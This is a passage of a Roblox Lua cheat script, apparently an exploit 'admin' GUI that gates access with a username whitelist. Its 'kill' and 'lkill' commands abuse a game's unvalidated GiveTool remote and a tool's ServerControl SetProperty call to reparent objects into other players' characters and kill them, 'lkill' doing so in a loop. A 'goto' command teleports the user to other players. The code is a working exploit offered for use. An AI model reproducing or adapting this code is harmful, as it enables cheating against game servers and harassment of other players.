        RobloxianLife:SetLocalProperty(localPlayer.Character.Humanoid, "HipHeight", 0.1)
        RobloxianLife:SetLocalProperty(localPlayer.Character.Humanoid.RootPart.RootJoint, "Part1", v.Character:FindFirstChild'Torso' and v.Character.Torso or v.Character.LowerTorso)
    end
end)

CommandApi:AddCommand("lnvalid", function(mult) 
    mult = tonumber(mult)
    if not mult then return end

    local function multiplycf(cf, m)
        return CFrame.new(cf.p*m)*CFrame.fromOrientation(cf:ToOrientation())
    end

    for i,v in pairs(localPlayer.Character:GetDescendants()) do
        if v:isA"BasePart" then
            RobloxianLife:SetLocalProperty(v,"Size", v.Size*mult)
        elseif v:isA"Motor6D" then
            RobloxianLife:SetLocalProperty(v,"C0", multiplycf(v.C0, mult))
            RobloxianLife:SetLocalProperty(v,"C1", multiplycf(v.C1, mult))
        end
    end
end)

 local chatConnection = localPlayer.Chatted:Connect(CommandApi.OnChatted)

end)
-- ///////////////////////////////////////////////////////////////////////////////////////////|||||||||||||||
-- quick note! anything beyond this do not touch at all or else you will break the script     |||||||||||||||
-- i'll add notes to the things you can change/ not permited                                  |||||||||||||||    Prefix Script Made By YandZ#8406
-- ///////////////////////////////////////////////////////////////////////////////////////////|||||||||||||||
a=7602040
prefix = "^"
lplayer = game.Players.LocalPlayer
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)

function GetPlayer(String)
    local Found = {}
    local strl = String:lower()
    if strl == "all" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name ~= lplayer.Name then
                table.insert(Found,v)
            end
        end   
    elseif strl == "me" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name == lplayer.Name then
                table.insert(Found,v)
            end
        end  
    else
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                table.insert(Found,v)
            end
        end    
    end
    return Found    
end
if string.sub(msg,1,6)==prefix.."goto " then
for i, v in pairs(GetPlayer(string.sub(msg, 7))) do
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame    
end
end;

if string.sub(msg,1,7)==prefix.."lkill "then 
for f,g in pairs(GetPlayer(string.sub(msg,8)))do 
local C=game:GetService('Players').LocalPlayer.Name
local D={}
local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
function D:FireEvent(H,I,J,K)G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})end
_G.lkill=true
while _G.lkill do 
game.Workspace.GiveTool:FireServer(a,"PompousTheCloud")F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Handle,"Name","Head")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head.Mesh,"MeshId","0")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head,"Parent",game.Players[g.Name].Character)
game.Players.LocalPlayer.Character.PompousTheCloud:Remove()wait(1)
end 
end 
end;

if string.sub(msg,1,6)==prefix.."kill "then
game.workspace.GiveTool:FireServer("7602040", "PompousTheCloud") 
for f,g in pairs(GetPlayer(string.sub(msg,7)))do 
local C=game:GetService('Players').LocalPlayer.Name;
local D={}
local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
function D:FireEvent(H,I,J,K)
G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
end;
game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Handle,"Name","Head")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head.Mesh,"MeshId","0")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head,"Parent",game.Players[g.Name].Character)
game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
end 
end
end)
end)

Close.Name = "Close"
Close.Parent = MainGUI
Close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Close.BorderColor3 = Color3.fromRGB(255, 0, 0)
Close.Position = UDim2.new(0.870535731, 0, -0.00244498788, 0)
Close.Size = UDim2.new(0, 57, 0, 50)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(255, 0, 0)
Close.TextScaled = true
Close.TextSize = 14.000
Close.TextWrapped = true
Close.MouseButton1Click:connect(function()
	MainGUI.Visible = false
	OpenGUI.Visible = true
end)

OpenGUI.Name = "OpenGUI"
OpenGUI.Parent = DeadlyAdmin
OpenGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OpenGUI.BackgroundTransparency = (1)
OpenGUI.BorderColor3 = Color3.fromRGB(255, 0, 0)
OpenGUI.Position = UDim2.new(0.429166675, 0, 0.0982800946, 0)
OpenGUI.Size = UDim2.new(0, 170, 0, 34)
OpenGUI.Visible = false
OpenGUI.Active = true
OpenGUI.Draggable = true

Open.Name = "Open"
Open.Parent = OpenGUI
Open.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Open.BorderColor3 = Color3.fromRGB(255, 0, 0)
Open.Size = UDim2.new(0, 200, 0, 50)
Open.Font = Enum.Font.SourceSans
Open.Text = "OPEN"
Open.TextColor3 = Color3.fromRGB(47, 11, 255)
Open.TextScaled = true
Open.TextSize = 14.000
Open.TextWrapped = true
Open.Active = true
Open.Draggable = true
Open.MouseButton1Click:connect(function()
	MainGUI.Visible = true
	OpenGUI.Visible = false
end)
-- whitelist;
if game.Players.LocalPlayer.Name == "8hpx" then
	wait(10)
    Status.Text = "Status: Hello 8hpx! Happy To have you here Co-Owner! :)"
    wait(5)
OpenGUI.Visible = true
CheckPlayer.Visible = false
elseif game.Players.LocalPlayer.Name == "HaxWeak" then
	wait(10)
Status.Text = "Status: Hello HaxWeak! Happy to have you here Owner! :)"
wait(5)
OpenGUI.Visible = true
CheckPlayer.Visible = false
elseif game.Players.LocalPlayer.Name == "Blacklisted" then
	game.Players.LocalPlayer:kick("You are Blacklisted from this admin")
else
	game.Players.LocalPlayer:kick("You are not whitelisted please contact YandZ#8406 or lowkey#6429")
end
